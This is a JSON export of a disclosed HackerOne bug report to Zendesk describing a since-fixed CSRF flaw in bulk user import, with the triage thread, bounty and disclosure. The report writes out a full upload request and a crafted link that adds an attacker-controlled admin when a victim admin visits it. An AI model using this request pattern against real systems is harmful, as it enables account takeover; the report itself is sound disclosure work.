{"id":102194,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDIxOTQ=","url":"https://hackerone.com/reports/102194","title":"[CRITICAL] CSRF leading to account take over","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-11-26T16:07:35.352Z","submitted_at":"2015-11-26T16:07:35.352Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"zombiehelp54","url":"/zombiehelp54","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":205,"url":"https://hackerone.com/zendesk","handle":"zendesk","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/205/1f7838d9b4201d122e0a7fbacc8ff3e90f57fa0c_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/205/1f7838d9b4201d122e0a7fbacc8ff3e90f57fa0c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Zendesk","twitter_handle":"","website":"https://www.zendesk.com","about":"Zendesk is a leading cloud-based customer service software solution. Over 100,000 customer accounts use Zendesk to increase customer satisfaction."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-04-04T21:48:40.130Z","bug_reporter_agreed_on_going_public_at":"2016-01-16T19:29:43.481Z","team_member_agreed_on_going_public_at":"2016-04-04T21:48:39.649Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi , I have found a CSRF issue in `\u003cyour_zebdesk\u003e.zendesk.com/jobs/createjob` that leads to full account take over.\n#Details: \nWhen using bulk user import in `https://\u003cyour_zendesk\u003e.zendesk.com/import?kind=user` after you upload a CSV file and press import , a request is sent to `https://\u003cyour_zendesk\u003e.zendesk.com/jobs/createjob?[password_email_change_csv_import]=true\u0026job[token]=IozGNzPJIR1AniyrlueEIkLL8\u0026job[update_records]=true\u0026return_to=/people\u0026type=user_import`. \nif you look at the request you'll see that the only token sent in the request is the `job[token]` value , so I have tried to change the url to `https://\u003cvictim_account\u003e.zendesk.com/jobs/createjob?[password_email_change_csv_import]=true\u0026job[token]=IozGNzPJIR1AniyrlueEIkLL8\u0026job[update_records]=true\u0026return_to=/people\u0026type=user_import` , but the import failed and I received an email saying that there was an error when importing the users , but the error gave me a hint , This was the email: \n```\nFor some reason the data to import was not ready in our servers. Try again.\n\nWe've been notified about this and will solve the problem if there's a bug. If the error persists, please contact our support team. The error was:\n\nundefined method `attachments' for nil:NilClass\n```\nas you can see the error gives a hint that the `job[token]` parameter value is an id of the uploaded CSV file which can only be generated when uploading the csv file in the bulk user import page. \nBut , wait a second , it says `attachments` which mean it's actually an id of an attachment , so if the attacker signed up as an end user account and tried to submit a ticket then uploaded his csv file as an attachment and got the file id and replaced it with the `job[token]` parameter value , so the link will look like : \n`https://\u003cvictim_account\u003e.zendesk.com/jobs/createjob?[password_email_change_csv_import]=true\u0026job[token]=\u003cuploaded_file_id\u003e\u0026job[update_records]=true\u0026return_to=/people\u0026type=user_import`, it will work and if the attacker sent that link to an admin user and the admin visited it , a user with admin privileges will be added!\n\n#Steps to reproduce:\n1. Login to your zendesk account as an end-user \n2.  Send this POST request through the end user:\n\n```\n POST https://\u003caccount\u003e.zendesk.com/hc/en-us/request_uploads\nHost: sad69.zendesk.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-CSRF-Token: KVUlCzxLTdJRkLuZrsGoYMNWgaL56Y3Rg3SwX6DyuMi7UkWo7pEV2I7auJVAmD8k+KKo6d5o0wsouRjzWwsvWQ==\nX-Requested-With: XMLHttpRequest\nReferer: https://sad69.zendesk.com/hc/en-us/requests/new\nContent-Length: 557\nContent-Type: multipart/form-data; boundary=---------------------------3915858413600\nCookie: \u003csession_cookies\u003e\nConnection: keep-alive\nPragma: no-cache\nCache-Control: no-cache\n\n\n-----------------------------3915858413600\nContent-Disposition: form-data; name=\"authenticity_token\"\n\n\u003cyour_token\u003e\n-----------------------------3915858413600\nContent-Disposition: form-data; name=\"file\"; filename=\"csv.csv\"\nContent-Type: application/vnd.ms-excel\n\n\"name\",\"email\",\"external_id\",\"details\",\"notes\",\"phone\",\"role\",\n\"restriction\",\"organization\",\"tags\"\nHacker,\"attacker@example.com\",,,,,\"admin\",\"This is a hacker\",,\n-----------------------------3915858413600--\n```\n\n3- Now get the response of the request then get the `ID` of the uploaded file , which will look like this `dwYMJH6N8QloZt7lFJeZ9bN26` (Please note that the id is not the attachment token)\n4- After that logout from the end user account then login with the account owner account and go to:\n\n```\nhttps://\u003caccount\u003e.zendesk.com/jobs/create?job[password_email_change_csv_import]=true\u0026job[token]=\u003cuploaded_file_id\u003e\u0026job[update_records]=true\u0026return_to=/people\u0026type=user_import\n```\n5- Go to the agent email and you'll see an email saying that user import successfully completed , also you can verify by going to `https://\u003cyour_account\u003e.zendesk.com/users` and you'll see that an admin named **Hacker** Was added. \n\nI will attach the CSV file for importing the user , just in case you are having a trouble sending the request in step 2. \n\nThanks. \n\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":63561,"file_name":"csv.csv","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/063/561/b139ee08a0f16cd7b586e1ca79b831eda46c8ed8/csv.csv?response-content-disposition=attachment%3B%20filename%3D%22csv.csv%22%3B%20filename%2A%3DUTF-8%27%27csv.csv\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVDBASJ4Q%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T131711Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJIMEYCIQDMdOR8DzxdsM%2B6Nk%2BzXUgAoPrxENIVmPciK7W1QkTEBAIhAPZfGsC3rMFHuNTCed2J3zTsoLVhq74QDkDUqwaAjmKbKoMECO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igws83MXdHvRQdFvESMq1wMqxEsLwoOZjIVt8a3wfYXFAiCeqeu8AhIJ6Q7Gntu36a0%2Blks6a5lEO%2FYz77dG0sIpLYJ92lhokB43YiQ7PkQCfXpRFTl9ereVcz8C%2Ba%2B6ghwT05v12IJECBf189h3nq1I64rxvZIjtN0BImUDg10QomFml6x8R3iLnCYd%2BLAEiGAatULKrnyAIAqUluvo7wOm%2Br90IqmVB75trWkwZcISqhUy3kQvSoTg%2Fsd1zrhvp96u7V9CbvWMDgw50GUylR80KcMhS8pMk07p2NCJVpFXvli9CcdErLq3atydz1iEYs3wmS%2FxGo5ybz%2BFBSBrGAwGQOnYxhYrDiVwepytoLlc0A1YwGzvc%2BhkK7ughwOXGyiEKlYNhpv2iUGk%2FoPAwW9VnMiQ4LHLaf2z%2FxFIC%2FfPgJBsV5dn%2BlvlcrXTNgUone9y6c7%2BBn1eqR2LMzvU8Ycy553Ru%2Fkm%2FBzMexK1Hyt%2Fhdt%2FQQXlD1cuP5rMTD42svdfgSWDAQudumXSmBAH2X7ZE74Gaw2h4JQmynzGH%2FOFS6Lmlo%2Bofjpji8JaNzh4GW2JXmbTgsUVdFELkd37rtrSORTYe8Y8rrt1akUkkcNu6DMm%2FyGhDUPJ%2FxK7RrGHOug4ufna%2BIIw6s%2BQiwY6pAFb0ppMhwpE1Uun0MFKa8So8GqZEnxDHG9kJkScDGktuYxZAg1a2hM6HfHooNOwO3ShyPn3yIRD1SLYdgBYVYgQjezJJsVSMNj3BNuqf0DS%2Bf73xIul9mOcsJPW3HwfDOsCUstdfVvyIllvZucN31%2BOA6uE6BxOAGvrA0Zq5Z%2Fv3289%2BB9Q2%2F0GwwsZ1qBhJjETaZ%2BiY8WDpCmp7t5KzvM1us%2F6Eg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=946dbe312e63f22f810ba9ef154abd44bc97f77ff4beaeec6f16756aefedde36","file_size":163,"type":"text/plain"}],"allow_singular_disclosure_at":"2016-02-15T19:29:43.728Z","allow_singular_disclosure_after":-178393647.44210202,"singular_disclosure_allowed":true,"vote_count":5,"voters":["bogdantcaciuc","sodium_","t4ym","spetr0x","dyabla"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":700267,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @zombiehelp54,\n\nThank you for reporting this issue. The Zendesk Security Team will begin investigating the details of your report immediately. If the issue is verified as a security vulnerability, we will contact you with a timeline for remediation and the amount awarded for the submitted issue.\n\nRegards,\n[Zendesk Security](https://www.zendesk.com/product/features/zendesk-security/)","automated_response":false,"created_at":"2015-11-26T18:20:20.297Z","updated_at":"2015-11-26T18:20:20.297Z","actor":{"username":"noops43","cleared":false,"url":"/noops43","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zendesk","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":700310,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003eHi , I have found a CSRF issue in `\u003cyour_zebdesk\u003e.zendesk.com/jobs/createjob` that leads to full account take over.\n\nSorry it's in `\u003cyour_zebdesk\u003e.zendesk.com/jobs/create`","automated_response":false,"created_at":"2015-11-26T19:55:38.139Z","updated_at":"2015-11-26T19:55:38.139Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zendesk","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":702156,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @noops43 , have you managed to reproduce this?","automated_response":false,"created_at":"2015-11-30T00:44:56.310Z","updated_at":"2015-11-30T00:44:56.310Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zendesk","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":703093,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @zombiehelp54,\n\nYes, I was able to reproduce this issue. Thank you for the clear explanation and detailed report. I'll get back to you soon. \n\nRegards,\n[Zendesk Security](https://www.zendesk.com/product/features/zendesk-security/)","automated_response":false,"created_at":"2015-11-30T18:54:08.647Z","updated_at":"2015-11-30T18:54:08.647Z","actor":{"username":"noops43","cleared":false,"url":"/noops43","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zendesk","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":703526,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hello @zombiehelp54,\n\nCongratulations! Your submitted vulnerability has been validated and is in process for remediation. \n\nAlso, you will be awarded $500 and publicly thanked for the responsible disclosure on our Hall of Fame. \n\nRegards,\n[Zendesk Security](https://www.zendesk.com/product/features/zendesk-security/)","automated_response":false,"created_at":"2015-11-30T22:18:05.139Z","updated_at":"2015-11-30T22:18:05.139Z","actor":{"url":"/zendesk","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/205/1f7838d9b4201d122e0a7fbacc8ff3e90f57fa0c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Zendesk"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"zendesk","collaborator":{"username":"zombiehelp54","url":"/zombiehelp54"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":703527,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2015-11-30T22:18:13.070Z","updated_at":"2015-11-30T22:18:13.070Z","actor":{"username":"noops43","cleared":false,"url":"/noops43","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zendesk","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":760257,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @zombiehelp54,\n\nYour submitted issue has been remediated. Can you also verify the fix before we resolve this bug?\n\nRegards,\n[Zendesk Security](https://www.zendesk.com/product/features/zendesk-security/)","automated_response":false,"created_at":"2016-01-16T01:21:39.877Z","updated_at":"2016-01-16T01:21:39.877Z","actor":{"username":"noops43","cleared":false,"url":"/noops43","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zendesk","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":760351,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The endpoint `\u003caccount\u003e.zendesk.com/jobs/create` no longer exists (returns a 404 error) , so yes I confirm that this issue is fixed.","automated_response":false,"created_at":"2016-01-16T04:05:45.572Z","updated_at":"2016-01-16T04:15:29.106Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zendesk","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":760706,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for participating in the [Zendesk Bug Bounty program](https://hackerone.com/zendesk). Please feel free to reach out if you have any questions or concerns.\n\nRegards,\n[Zendesk Security](https://www.zendesk.com/product/features/zendesk-security/)","automated_response":false,"created_at":"2016-01-16T17:28:30.804Z","updated_at":"2016-01-16T17:28:30.804Z","actor":{"username":"noops43","cleared":false,"url":"/noops43","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"zombiehelp54","url":"/zombiehelp54"},"genius_execution_id":null,"team_handle":"zendesk","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":760755,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Can we disclose it publicly ? ","automated_response":false,"created_at":"2016-01-16T19:29:43.511Z","updated_at":"2016-01-16T19:29:43.511Z","first_to_agree":true,"actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zendesk","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":883005,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi , I would like to publish a blog post about this , could you accept the disclosure request ? ","automated_response":false,"created_at":"2016-04-01T16:06:04.062Z","updated_at":"2016-04-01T16:06:10.591Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zendesk","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":888583,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-04-04T21:48:39.694Z","updated_at":"2016-04-04T21:48:39.694Z","actor":{"username":"noops43","cleared":false,"url":"/noops43","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zendesk","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":888584,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-04-04T21:48:40.172Z","updated_at":"2016-04-04T21:48:40.172Z","actor":{"username":"noops43","cleared":false,"url":"/noops43","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zendesk","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}